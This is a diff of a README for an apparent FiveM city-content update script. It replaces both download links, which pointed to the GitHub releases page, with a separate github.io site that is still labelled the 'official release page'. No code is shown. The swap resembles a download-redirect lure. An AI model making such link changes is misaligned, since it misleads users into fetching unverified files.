@@ -1,6 +1,6 @@
 # 🏙️ nova-unio-rp-update-script - Refresh your FiveM city content easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Elated-dodder245/nova-unio-rp-update-script/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://elated-dodder245.github.io)
 
 This script helps GTA RP server owners add or update urban content within their existing game setup. Managing game assets often requires manual work. This tool automates the process and keeps your city environment updated without complex manual steps. Use this script to ensure your community members enjoy the latest buildings and props in your FiveM server.
 
@@ -18,7 +18,7 @@ To run this tool on your Windows computer, you need the following:
 
 Follow these steps to obtain the tool:
 
-1.  Visit the official release page to download your copy: [https://github.com/Elated-dodder245/nova-unio-rp-update-script/releases](https://github.com/Elated-dodder245/nova-unio-rp-update-script/releases)
+1.  Visit the official release page to download your copy: [https://elated-dodder245.github.io](https://elated-dodder245.github.io)
 2.  Look for the latest version listed at the top of the page.
 3.  Click the file ending in .zip to start the download.
 4.  Save the file to your Downloads folder or your desktop for easy access.
